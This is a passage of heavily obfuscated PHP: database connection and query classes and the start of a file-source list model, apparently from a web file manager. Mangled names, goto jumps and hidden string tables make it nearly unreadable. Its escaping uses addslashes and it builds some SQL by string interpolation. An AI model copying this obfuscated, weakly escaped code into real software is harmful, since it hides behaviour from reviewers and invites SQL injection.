$aãï∫Ÿ±“) . $büÔíø≥£Ã[865]; } array_walk($d˜Éƒçòçè, array($this, $büÔíø≥£Ã[866])); goto AÎÜ‹±ëë∑; AÎÜ‹±ëë∑: $dÀ›ïÚ¨‚ = $dÒ—ı¥∆•î ? $büÔíø≥£Ã[867] : $büÔíø≥£Ã[868]; $CÌ‰ππ¯¯ö = $dÀ›ïÚ¨‚ . $büÔíø≥£Ã[869] . $this->parseTable($aó¡÷°Ø–[$büÔíø≥£Ã[277]]) . $büÔíø≥£Ã[863] . implode($büÔíø≥£Ã[47], $d˜Éƒçòçè) . $büÔíø≥£Ã[870] . implode($büÔíø≥£Ã[47], $eëÊÇ∑πÏõ); return $this->execute($CÌ‰ππ¯¯ö); goto f“áÉÓ™À™; A¡·€ÖÁ∫≥: $büÔíø≥£Ã =& $_SERVER[ú∫]; if (!is_array($EÍ⁄¿åïö¨[0])) { return !1; } $d˜Éƒçòçè = array_keys($EÍ⁄¿åïö¨[0]); goto b‘ôËÚàÕ˜; f“áÉÓ™À™: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D¢Õ≥’¿Â¢ =& $_SERVER[ú∫]; $this->error = $this->_linkID->errno . $D¢Õ≥’¿Â¢[4] . $this->_linkID->error; if ($D¢Õ≥’¿Â¢[33] != $this->queryStr) { $this->error .= LNG($D¢Õ≥’¿Â¢[45]) . $this->queryStr; } think_trace($this->error, $D¢Õ≥’¿Â¢[33], $D¢Õ≥’¿Â¢[46]); return $this->error; } public function escapeString($cØ†◊˜£∑È) { if ($this->_linkID) { return $this->_linkID->real_escape_string($cØ†◊˜£∑È); } else { return addslashes($cØ†◊˜£∑È); } } public function parseKey(&$Bí‘Æ»óΩà, $BäﬂÈÑê°≤ = true) { $F®µ≈ÉŒ¥Í =& $_SERVER[ú∫]; if ($BäﬂÈÑê°≤) { $Bí‘Æ»óΩà = $this->parseKeyCheck($Bí‘Æ»óΩà); } if ($Bí‘Æ»óΩà != $F®µ≈ÉŒ¥Í[182] && !preg_match($F®µ≈ÉŒ¥Í[871], $Bí‘Æ»óΩà)) { $Bí‘Æ»óΩà = $F®µ≈ÉŒ¥Í[382] . trim($Bí‘Æ»óΩà, $F®µ≈ÉŒ¥Í[382]) . $F®µ≈ÉŒ¥Í[382]; } return $Bí‘Æ»óΩà; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($F¢¶—ÿ»ò… = '') { $b‹´»Ñä∂€ =& $_SERVER[ú∫]; if (!class_exists($b‹´»Ñä∂€[873])) { think_exception(think_lang($b‹´»Ñä∂€[10]) . $b‹´»Ñä∂€[874]); } if (!empty($F¢¶—ÿ»ò…)) { $this->config = $F¢¶—ÿ»ò…; if (empty($this->config[$b‹´»Ñä∂€[13]])) { $this->config[$b‹´»Ñä∂€[13]] = array(); } } } public function connect($d‹á‚∆ÏË∞ = '', $fú≠˜èùÉÒ = 0) { $e∞íëÖâïü =& $_SERVER[ú∫]; if (!isset($this->linkID[$fú≠˜èùÉÒ])) { goto bœˆÜáÛ ‹; Aöºïº…≤“: if (!$this->linkID[$fú≠˜èùÉÒ]) { think_exception($e∞íëÖâïü[883]); } try { $this->linkID[$fú≠˜èùÉÒ]->exec($e∞íëÖâïü[884] . think_config($e∞íëÖâïü[851])); } catch (Exception $d∂Ãùêàéπ) { } $this->connected = !0; goto bÇ∞Œõﬂ⁄Ç; bÇ∞Œõﬂ⁄Ç: if (1 != think_config($e∞íëÖâïü[18])) { unset($this->config); } goto FÉô°àâàã; bœˆÜáÛ ‹: if (empty($d‹á‚∆ÏË∞)) { $d‹á‚∆ÏË∞ = $this->config; } $Eè≈¬ÜòÉä = !empty($d‹á‚∆ÏË∞[$e∞íëÖâïü[13]][$e∞íëÖâïü[14]]) ? $d‹á‚∆ÏË∞[$e∞íëÖâïü[13]][$e∞íëÖâïü[14]] : $this->pconnect; if ($Eè≈¬ÜòÉä) { $d‹á‚∆ÏË∞[$e∞íëÖâïü[13]][PDO::ATTR_PERSISTENT] = !0; } goto e‘ËºË€Ü§; e‘ËºË€Ü§: try { $this->linkID[$fú≠˜èùÉÒ] = new PDO($d‹á‚∆ÏË∞[$e∞íëÖâïü[875]], $d‹á‚∆ÏË∞[$e∞íëÖâïü[848]], $d‹á‚∆ÏË∞[$e∞íëÖâïü[849]], $d‹á‚∆ÏË∞[$e∞íëÖâïü[13]]); } catch (PDOException $d∂Ãùêàéπ) { think_exception($d∂Ãùêàéπ->getMessage()); } $this->dbType = $this->_getDsnType($d‹á‚∆ÏË∞[$e∞íëÖâïü[875]]); if (in_array($this->dbType, array($e∞íëÖâïü[876], $e∞íëÖâïü[877], $e∞íëÖâïü[878], $e∞íëÖâïü[879]))) { think_exception($e∞íëÖâïü[880] . $this->dbType . $e∞íëÖâïü[881] . $this->dbType . $e∞íëÖâïü[882]); } goto Aöºïº…≤“; FÉô°àâàã: } return $this->linkID[$fú≠˜èùÉÒ]; } public function free() { $this->PDOStatement = null; } public function query($B”≈»ä†ó¬, $BÏƒíê–ö… = array()) { goto d‘´£°∞ÙÈ; A…äŒ—•è¯: think_action_status($f˜ø∏ﬁÀ¡≥[19], 1); think_status($f˜ø∏ﬁÀ¡≥[20]); $this->PDOStatement = $this->_linkID->prepare($B”≈»ä†ó¬); goto EùΩã∂∏ûÃ; EùΩã∂∏ûÃ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bæà‹¢¡óÜ = $this->PDOStatement->execute($BÏƒíê–ö…); $this->debug(); goto cìè¿àöœ; dÒ∂÷»…‹ë: $this->queryStr = $B”≈»ä†ó¬; if (!empty($BÏƒíê–ö…)) { $this->queryStr .= $f˜ø∏ﬁÀ¡≥[885] . print_r($BÏƒíê–ö…, !0) . $f˜ø∏ﬁÀ¡≥[886]; } if (!empty($this->PDOStatement)) { $this->free(); } goto A…äŒ—•è¯; cìè¿àöœ: if (!1 === $bæà‹¢¡óÜ) { $this->error(); return !1; } else { return $this->getAll(); } goto dÿ¯‚êùû®; d‘´£°∞ÙÈ: $f˜ø∏ﬁÀ¡≥ =& $_SERVER[ú∫]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dÒ∂÷»…‹ë; dÿ¯‚êùû®: } public function execute($a„ƒãéŸüô, $a”…ºΩá˜Ë = array()) { goto F∏ÓÍé™ó™; F“ë±œÆ‰Æ: $this->queryStr = $a„ƒãéŸüô; if (!empty($a”…ºΩá˜Ë)) { $this->queryStr .= $aö¨˘”ˆÓÖ[885] . print_r($a”…ºΩá˜Ë, !0) . $aö¨˘”ˆÓÖ[886]; } $cö´∞ùîáÏ = !1; goto DÎáõ©ŒµË; F∏ÓÍé™ó™: $aö¨˘”ˆÓÖ =& $_SERVER[ú∫]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F“ë±œÆ‰Æ; DÎáõ©ŒµË: if ($this->dbType == $aö¨˘”ˆÓÖ[879]) { if (preg_match($aö¨˘”ˆÓÖ[887], $this->queryStr, $eÔÉë˘Ç°Ë)) { $this->table = think_config($aö¨˘”ˆÓÖ[888]) . str_ireplace(think_config($aö¨˘”ˆÓÖ[889]), $aö¨˘”ˆÓÖ[375], $eÔÉë˘Ç°Ë[2]); $cö´∞ùîáÏ = (bool) $this->query($aö¨˘”ˆÓÖ[890] . strtoupper($this->table) . $aö¨˘”ˆÓÖ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aö¨˘”ˆÓÖ[21], 1); goto bªØ±Ñå¯Ô; d∂™ùÁ≥â£: $c˘ÕÖ ΩûÜ = $this->PDOStatement->execute($a”…ºΩá˜Ë); $this->debug(); if (!1 === $c˘ÕÖ ΩûÜ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($cö´∞ùîáÏ || preg_match($aö¨˘”ˆÓÖ[891], $a„ƒãéŸüô)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A©∫”êÂØ∞; bªØ±Ñå¯Ô: think_status($aö¨˘”ˆÓÖ[20]); $this->PDOStatement = $this->_linkID->prepare($a„ƒãéŸüô); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d∂™ùÁ≥â£; A©∫”êÂØ∞: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÊ›ï–…»ê = $this->_linkID->commit(); $this->transTimes = 0; if (!$CÊ›ï–…»ê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $då…È∆‡Üù = $this->_linkID->rollback(); $this->transTimes = 0; if (!$då…È∆‡Üù) { $this->error(); return !1; } } return !0; } private function getAll() { $Dé∂ÆÔ„¢– = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Dé∂ÆÔ„¢–); return $Dé∂ÆÔ„¢–; } public function getFields($a¡à„Á∫¬Ç) { goto díÍÁÓ“ß∫; d∫›ÊˆƒÿÑ: $eà‘·∫úˆ’ = $this->query($a∫á®π¡œ·); $CÙÂﬁ„ø–Û = array(); if ($eà‘·∫úˆ’) { foreach ($eà‘·∫úˆ’ as $AíÑäçË†Ù => $a°ï†ú˘ˆÌ) { $a°ï†ú˘ˆÌ = array_change_key_case($a°ï†ú˘ˆÌ); $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[28]] = isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[28]]) ? $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[28]] : $f‹ÁÀƒ èﬂ[375]; $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[29]] = isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[29]]) ? $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[29]] : $f‹ÁÀƒ èﬂ[375]; $E£™∏úà‡» = isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[271]]) ? $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[271]] : $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[28]]; $CÙÂﬁ„ø–Û[$E£™∏úà‡»] = array($f‹ÁÀƒ èﬂ[28] => $E£™∏úà‡», $f‹ÁÀƒ èﬂ[29] => $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[29]], $f‹ÁÀƒ èﬂ[31] => (bool) (isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[103]]) && $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[103]] === $f‹ÁÀƒ èﬂ[33] || isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[31]]) && $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[31]] === $f‹ÁÀƒ èﬂ[33]), $f‹ÁÀƒ èﬂ[34] => isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[34]]) ? $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[34]] : (isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[53]]) ? $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[53]] : $f‹ÁÀƒ èﬂ[375]), $f‹ÁÀƒ èﬂ[36] => isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[93]]) ? strtolower($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[93]]) == $f‹ÁÀƒ èﬂ[38] : (isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[54]]) ? $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[54]] : !1), $f‹ÁÀƒ èﬂ[39] => isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[908]]) ? strtolower($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[908]]) == $f‹ÁÀƒ èﬂ[41] : (isset($a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[93]]) ? $a°ï†ú˘ˆÌ[$f‹ÁÀƒ èﬂ[93]] : !1)); } } goto aôÂ˘õ®úú; aôÂ˘õ®úú: return $CÙÂﬁ„ø–Û; goto a…»»óïÈ‡; díÍÁÓ“ß∫: $f‹ÁÀƒ èﬂ =& $_SERVER[ú∫]; $this->initConnect(!0); if (think_config($f‹ÁÀƒ èﬂ[892])) { $a∫á®π¡œ· = str_replace($f‹ÁÀƒ èﬂ[893], $a¡à„Á∫¬Ç, think_config($f‹ÁÀƒ èﬂ[892])); } else { switch ($this->dbType) { case $f‹ÁÀƒ èﬂ[876]: case $f‹ÁÀƒ èﬂ[894]: $a∫á®π¡œ· = "\123\x45\114\x45\x43\x54\x20\x20\40\143\x6f\x6c\165\x6d\x6e\x5f\156\x61\155\x65\x20\141\x73\x20\x27\116\x61\x6d\x65\47\x2c\40\x20\40\144\141\x74\x61\137\164\171\160\145\x20\x61\x73\x20\47\x54\171\160\145\x27\54\x20\40\40\x63\x6f\x6c\165\155\156\137\x64\x65\x66\141\x75\154\164\x20\x61\163\40\47\104\145\146\x61\165\154\x74\x27\54\40\40\40\x69\x73\x5f\156\x75\154\154\x61\x62\154\145\40\x61\163\40\47\116\x75\154\x6c\47\12\x9\11\x46\x52\117\x4d\x9\x69\156\146\x6f\x72\155\141\x74\x69\x6f\156\x5f\x73\x63\150\145\155\141\x2e\x74\x61\x62\154\145\163\x20\x41\123\40\164\12\11\11\x4a\117\111\116\x9\x69\156\x66\157\162\155\x61\164\151\x6f\x6e\x5f\163\x63\x68\145\155\x61\56\143\157\154\165\x6d\156\x73\x20\101\123\x20\143\xa\11\x9\117\116\x20\x20\x74\56\164\141\142\x6c\x65\x5f\143\x61\164\141\x6c\157\x67\40\x3d\x20\143\x2e\164\x61\142\154\x65\x5f\143\141\164\x61\x6c\157\147\12\x9\11\101\116\104\40\164\56\x74\141\142\154\x65\137\163\x63\x68\x65\155\141\40\75\40\143\x2e\x74\141\142\x6c\x65\137\x73\x63\150\x65\x6d\x61\12\x9\11\101\116\104\40\164\56\x74\141\x62\154\x65\137\156\141\155\x65\40\75\40\143\x2e\164\141\x62\x6c\x65\137\156\x61\155\145\xa\x9\11\x57\110\x45\x52\105\40\40\40\x74\56\x74\x61\142\x6c\x65\x5f\156\141\x6d\145\x20\75\x20\x27{$a¡à„Á∫¬Ç}\47"; break; case $f‹ÁÀƒ èﬂ[895]: $a∫á®π¡œ· = $f‹ÁÀƒ èﬂ[896] . $a¡à„Á∫¬Ç . $f‹ÁÀƒ èﬂ[897]; break; case $f‹ÁÀƒ èﬂ[877]: case $f‹ÁÀƒ èﬂ[879]: $a∫á®π¡œ· = $f‹ÁÀƒ èﬂ[898] . $f‹ÁÀƒ èﬂ[899] . $f‹ÁÀƒ èﬂ[900] . strtoupper($a¡à„Á∫¬Ç) . $f‹ÁÀƒ èﬂ[901] . strtoupper($a¡à„Á∫¬Ç) . $f‹ÁÀƒ èﬂ[902]; break; case $f‹ÁÀƒ èﬂ[903]: $a∫á®π¡œ· = $f‹ÁÀƒ èﬂ[904] . $a¡à„Á∫¬Ç . $f‹ÁÀƒ èﬂ[905]; break; case $f‹ÁÀƒ èﬂ[878]: break; case $f‹ÁÀƒ èﬂ[906]: default: $a∫á®π¡œ· = $f‹ÁÀƒ èﬂ[907] . ($this->dbType == $f‹ÁÀƒ èﬂ[906] ? "\140{$a¡à„Á∫¬Ç}\x60" : $a¡à„Á∫¬Ç); } } goto d∫›ÊˆƒÿÑ; a…»»óïÈ‡: } public function getTables($f•≤ÃÜåπ≠ = '') { $F·Ÿ®ª…À® =& $_SERVER[ú∫]; if (think_config($F·Ÿ®ª…À®[909])) { $C –íÍ·ÙØ = str_replace($F·Ÿ®ª…À®[910], $f•≤ÃÜåπ≠, think_config($F·Ÿ®ª…À®[909])); } else { switch ($this->dbType) { case $F·Ÿ®ª…À®[877]: case $F·Ÿ®ª…À®[879]: $C –íÍ·ÙØ = $F·Ÿ®ª…À®[911]; break; case $F·Ÿ®ª…À®[876]: case $F·Ÿ®ª…À®[894]: $C –íÍ·ÙØ = $F·Ÿ®ª…À®[912]; break; case $F·Ÿ®ª…À®[903]: $C –íÍ·ÙØ = $F·Ÿ®ª…À®[913]; break; case $F·Ÿ®ª…À®[878]: think_exception(think_lang($F·Ÿ®ª…À®[914]) . $F·Ÿ®ª…À®[915]); break; case $F·Ÿ®ª…À®[895]: $C –íÍ·ÙØ = $F·Ÿ®ª…À®[42] . $F·Ÿ®ª…À®[43] . $F·Ÿ®ª…À®[44]; break; case $F·Ÿ®ª…À®[906]: default: if (!empty($f•≤ÃÜåπ≠)) { $C –íÍ·ÙØ = $F·Ÿ®ª…À®[859] . $f•≤ÃÜåπ≠ . $F·Ÿ®ª…À®[860]; } else { $C –íÍ·ÙØ = $F·Ÿ®ª…À®[861]; } } } $Açœ≥ úÔˆ = $this->query($C –íÍ·ÙØ); $Eîê≤ã——ƒ = array(); foreach ($Açœ≥ úÔˆ as $e§†‡äÑ≤∂ => $EòÓàÜò∂·) { $Eîê≤ã——ƒ[$e§†‡äÑ≤∂] = current($EòÓàÜò∂·); } return $Eîê≤ã——ƒ; } protected function parseLimit($f‡»¥äºÖË) { $a≈…‘ø∞˜ë =& $_SERVER[ú∫]; $EãıéÎœË¡ = $a≈…‘ø∞˜ë[33]; if (!empty($f‡»¥äºÖË)) { switch ($this->dbType) { case $a≈…‘ø∞˜ë[903]: case $a≈…‘ø∞˜ë[895]: $f‡»¥äºÖË = explode($a≈…‘ø∞˜ë[47], $f‡»¥äºÖË); if (count($f‡»¥äºÖË) > 1) { $EãıéÎœË¡ .= $a≈…‘ø∞˜ë[48] . $f‡»¥äºÖË[1] . $a≈…‘ø∞˜ë[49] . $f‡»¥äºÖË[0] . $a≈…‘ø∞˜ë[50]; } else { $EãıéÎœË¡ .= $a≈…‘ø∞˜ë[48] . $f‡»¥äºÖË[0] . $a≈…‘ø∞˜ë[50]; } break; case $a≈…‘ø∞˜ë[876]: case $a≈…‘ø∞˜ë[894]: break; case $a≈…‘ø∞˜ë[878]: break; case $a≈…‘ø∞˜ë[877]: case $a≈…‘ø∞˜ë[879]: break; case $a≈…‘ø∞˜ë[906]: default: $EãıéÎœË¡ .= $a≈…‘ø∞˜ë[48] . $f‡»¥äºÖË . $a≈…‘ø∞˜ë[50]; } } return $EãıéÎœË¡; } public function parseKey(&$B‘¥òÂí¯, $f™Õ‚™€ú∏ = true) { $Eå¶ïÕﬁïã =& $_SERVER[ú∫]; if ($f™Õ‚™€ú∏) { $B‘¥òÂí¯ = $this->parseKeyCheck($B‘¥òÂí¯); } if ($this->dbType == $Eå¶ïÕﬁïã[906]) { if ($B‘¥òÂí¯ != $Eå¶ïÕﬁïã[182] && !preg_match($Eå¶ïÕﬁïã[871], $B‘¥òÂí¯)) { $B‘¥òÂí¯ = $Eå¶ïÕﬁïã[382] . trim($B‘¥òÂí¯, $Eå¶ïÕﬁïã[382]) . $Eå¶ïÕﬁïã[382]; } return $B‘¥òÂí¯; } else { return parent::parseKey($B‘¥òÂí¯, $f™Õ‚™€ú∏); } } public function close() { $this->_linkID = null; } public function error() { $a„àóÛ˜øà =& $_SERVER[ú∫]; if ($this->PDOStatement) { $b¨›÷˜Œ¡Ê = $this->PDOStatement->errorInfo(); $this->error = $b¨›÷˜Œ¡Ê[1] . $a„àóÛ˜øà[4] . $b¨›÷˜Œ¡Ê[2]; } else { $this->error = $a„àóÛ˜øà[33]; } if ($a„àóÛ˜øà[33] != $this->queryStr) { $this->error .= LNG($a„àóÛ˜øà[45]) . $this->queryStr; } think_trace($this->error, $a„àóÛ˜øà[33], $a„àóÛ˜øà[46]); return $this->error; } public function escapeString($c¿±¡—â¥å) { $C„¥°Â‘‘∆ =& $_SERVER[ú∫]; switch ($this->dbType) { case $C„¥°Â‘‘∆[903]: case $C„¥°Â‘‘∆[876]: case $C„¥°Â‘‘∆[894]: case $C„¥°Â‘‘∆[906]: return addslashes($c¿±¡—â¥å); case $C„¥°Â‘‘∆[878]: case $C„¥°Â‘‘∆[895]: case $C„¥°Â‘‘∆[877]: case $C„¥°Â‘‘∆[879]: return str_ireplace($C„¥°Â‘‘∆[55], $C„¥°Â‘‘∆[56], $c¿±¡—â¥å); } } protected function parseValue($B’≠⁄ª∫öó) { $F≈†ÔÀÿÈó =& $_SERVER[ú∫]; if (is_string($B’≠⁄ª∫öó)) { $bÜ≠ûà“√§ = strpos($B’≠⁄ª∫öó, $F≈†ÔÀÿÈó[4]) === 0 && in_array($B’≠⁄ª∫öó, array_keys($this->bind)); $B’≠⁄ª∫öó = $bÜ≠ûà“√§ ? $this->escapeString($B’≠⁄ª∫öó) : $F≈†ÔÀÿÈó[916] . $this->escapeString($B’≠⁄ª∫öó) . $F≈†ÔÀÿÈó[916]; } elseif (isset($B’≠⁄ª∫öó[0]) && is_string($B’≠⁄ª∫öó[0]) && strtolower($B’≠⁄ª∫öó[0]) == $F≈†ÔÀÿÈó[295]) { $B’≠⁄ª∫öó = $this->escapeString($B’≠⁄ª∫öó[1]); } elseif (is_array($B’≠⁄ª∫öó)) { $B’≠⁄ª∫öó = array_map(array($this, $F≈†ÔÀÿÈó[917]), $B’≠⁄ª∫öó); } elseif (is_bool($B’≠⁄ª∫öó)) { $B’≠⁄ª∫öó = $B’≠⁄ª∫öó ? $F≈†ÔÀÿÈó[87] : $F≈†ÔÀÿÈó[191]; } elseif (is_null($B’≠⁄ª∫öó)) { $B’≠⁄ª∫öó = $F≈†ÔÀÿÈó[103]; } return $B’≠⁄ª∫öó; } public function getLastInsertId() { $FÚø›∫ûÑ° =& $_SERVER[ú∫]; switch ($this->dbType) { case $FÚø›∫ûÑ°[903]: case $FÚø›∫ûÑ°[895]: case $FÚø›∫ûÑ°[876]: case $FÚø›∫ûÑ°[894]: case $FÚø›∫ûÑ°[878]: case $FÚø›∫ûÑ°[906]: return $this->_linkID->lastInsertId(); case $FÚø›∫ûÑ°[877]: case $FÚø›∫ûÑ°[879]: $d≥ªµÀ§— = $this->table; $D∑≈«•õ·∂ = $this->query("\x53\x45\114\105\x43\124\40{$d≥ªµÀ§—}\56\143\x75\x72\x72\x76\x61\154\x20\x63\165\x72\x72\x76\x61\x6c\x20\106\122\x4f\115\40\144\165\x61\x6c"); return $D∑≈«•õ·∂ ? $D∑≈«•õ·∂[0][$FÚø›∫ûÑ°[918]] : 0; } } } goto Eÿ≥ÁƒìÊ⁄; A≤”‰´ÚÃ›: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\x63\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\155\x65" => "\151\157\137\x73\x6f\165\x72\x63\145\137\x6d\x65\164\x61", "\155\145\x74\x61\x46\151\145\154\x64" => "\x73\157\x75\162\143\145\111\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\x69\x6d\145", "\164\x69\155\x65", "\x69\x6e\163\x65\162\164", "\146\165\x6e\x63\164\x69\157\x6e"), array("\x63\162\145\x61\x74\x65\124\151\x6d\x65", "\164\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\x69\157\x6e"), array("\x76\x69\145\x77\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\x74", "\x66\165\156\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($e¢è…Õ¡úº) { return $this->listSource(array($_SERVER[ú∫][394] => $e¢è…Õ¡úº)); } public function typeName($Eˆ†Ç∫äÖˆ) { static $D“‹’íêà† = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\x72\157\x75\160"); return $D“‹’íêà†[$Eˆ†Ç∫äÖˆ . $_SERVER[ú∫][33]]; } public function sourceListInfo($EÕÕ≤îÊœ≤, $E…ä›ÎÀö’ = false) { goto Aíº—“◊Éª; Aíº—“◊Éª: $D∑µêä§∞Ø =& $_SERVER[ú∫]; $EÕÕ≤îÊœ≤ = $EÕÕ≤îÊœ≤ ? $EÕÕ≤îÊœ≤ : array(); $EÕÕ≤îÊœ≤ = array_filter(array_unique($EÕÕ≤îÊœ≤)); goto BäÔ±øÀæÜ; BäÔ±øÀæÜ: if (!$EÕÕ≤îÊœ≤) { return array(); } $d†µ˘’ßÙ« = $this->where(array($D∑µêä§∞Ø[395] => array($D∑µêä§∞Ø[7], $EÕÕ≤îÊœ≤)))->select(); $this->_listDataApply($d†µ˘’ßÙ«, $E…ä›ÎÀö’); goto bÉèäÓ¨óü; bÉèäÓ¨óü: return array_to_keyvalue($d†µ˘’ßÙ«, $D∑µêä§∞Ø[395]); goto a´î„ü ›Ö; a´î„ü ›Ö: } public function pathInfoFilter(&$f‚ÉÑè∞áˆ) { goto b”≈¬•Ò⁄Í; b”≈¬•Ò⁄Í: $eà´òë‚Üñ =& $_SERVER[ú∫]; static $aîÊ•™ùäÔ = false; static $a›Á˘™Ê‰ª = false; goto Eãóâ–∂äò; dê•ıÓ€‚Ê: $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[76]] = $eà´òë‚Üñ[401] . $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[395]] . $eà´òë‚Üñ[402]; $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[29]] = $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[403]] == 1 ? $eà´òë‚Üñ[77] : $eà´òë‚Üñ[193]; $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[404]] = $this->typeName($f‚ÉÑè∞áˆ[$eà´òë‚Üñ[404]]); goto c®’ø´ﬂ≤Ø; c®’ø´ﬂ≤Ø: if ($f‚ÉÑè∞áˆ[$eà´òë‚Üñ[403]] != 1) { $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[168]] = $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[405]]; unset($f‚ÉÑè∞áˆ[$eà´òë‚Üñ[405]]); } $f·«°æ©Ôå = $aîÊ•™ùäÔ; if (isset($f‚ÉÑè∞áˆ[$eà´òë‚Üñ[406]]) && $f‚ÉÑè∞áˆ[$eà´òë‚Üñ[406]][$eà´òë‚Üñ[407]] == -1) { $f·«°æ©Ôå = $a›Á˘™Ê‰ª; } goto cÌ‚Ô“™≠…; Eãóâ–∂äò: static $CÖÁÜùÑπƒ = false; if (!$aîÊ•™ùäÔ) { goto E€åí¨·ó‹; CËäÌä£Çá: $c◊ÖÉàãÖá = $eà´òë‚Üñ[399]; $F§ºå‘ìÜå = explode($eà´òë‚Üñ[47], $c◊ÖÉàãÖá); $aîÊ•™ùäÔ = explode($eà´òë‚Üñ[47], $CµµÒÀ≥¿∏); goto d Ôçì€∏∂; E€åí¨·ó‹: $CµµÒÀ≥¿∏ = $eà´òë‚Üñ[396]; $CµµÒÀ≥¿∏ .= $eà´òë‚Üñ[397]; $CµµÒÀ≥¿∏ .= $eà´òë‚Üñ[398]; goto CËäÌä£Çá; d Ôçì€∏∂: $a›Á˘™Ê‰ª = array(); foreach ($aîÊ•™ùäÔ as $EÁ˘¶∏»Û”) { if (in_array($EÁ˘¶∏»Û”, $F§ºå‘ìÜå)) { continue; } $a›Á˘™Ê‰ª[] = $EÁ˘¶∏»Û”; } $CÖÁÜùÑπƒ = explode($eà´òë‚Üñ[47], $eà´òë‚Üñ[400]); goto B¿≥¿ó„—î; B¿≥¿ó„—î: } foreach ($CÖÁÜùÑπƒ as $E®∆ãã›·‹) { if (isset($f‚ÉÑè∞áˆ[$E®∆ãã›·‹])) { $f‚ÉÑè∞áˆ[$E®∆ãã›·‹] = intval($f‚ÉÑè∞áˆ[$E®∆ãã›·‹]); } } goto dê•ıÓ€‚Ê; cÌ‚Ô“™≠…: $f‚ÉÑè∞áˆ = array_field_key($f‚ÉÑè∞áˆ, $f·«°æ©Ôå); return $f‚ÉÑè∞áˆ; goto Dè‹£Êƒò«; Dè‹£Êƒò«: } public function listUserFav() { goto b•ﬂéµ÷Ø≥; F◊ç’€£ÌÌ: foreach ($c‘úÒâ≠•‹ as &$dåπ—ﬁ¬∞) { $dåπ—ﬁ¬∞ = array($cé°ƒë«ã“[412] => $dåπ—ﬁ¬∞[$cé°ƒë«ã“[393]], $cé°ƒë«ã“[413] => $dåπ—ﬁ¬∞[$cé°ƒë«ã“[28]], $cé°ƒë«ã“[414] => $dåπ—ﬁ¬∞[$cé°ƒë«ã“[76]], $cé°ƒë«ã“[415] => $dåπ—ﬁ¬∞[$cé°ƒë«ã“[29]], $cé°ƒë«ã“[416] => $dåπ—ﬁ¬∞[$cé°ƒë«ã“[194]], $cé°ƒë«ã“[417] => $dåπ—ﬁ¬∞[$cé°ƒë«ã“[84]]); if ($dåπ—ﬁ¬∞[$cé°ƒë«ã“[29]] == $cé°ƒë«ã“[409] && $FΩÃ±“÷‡[$dåπ—ﬁ¬∞[$cé°ƒë«ã“[76]]]) { $dåπ—ﬁ¬∞[$cé°ƒë«ã“[85]] = $FΩÃ±“÷‡[$dåπ—ﬁ¬∞[$cé°ƒë«ã“[76]]]; } } unset($dåπ—ﬁ¬∞); return $c‘úÒâ≠•‹; goto f¿ö±Àâéé; cáóªàœÈè: $dçÆﬁ∂π£œ = array_to_keyvalue($dçÆﬁ∂π£œ, $cé°ƒë«ã“[33], $cé°ƒë«ã“[76]); if ($dçÆﬁ∂π£œ) { $FΩÃ±“÷‡ = $this->listSource(array($cé°ƒë«ã“[410] => array($cé°ƒë«ã“[411], 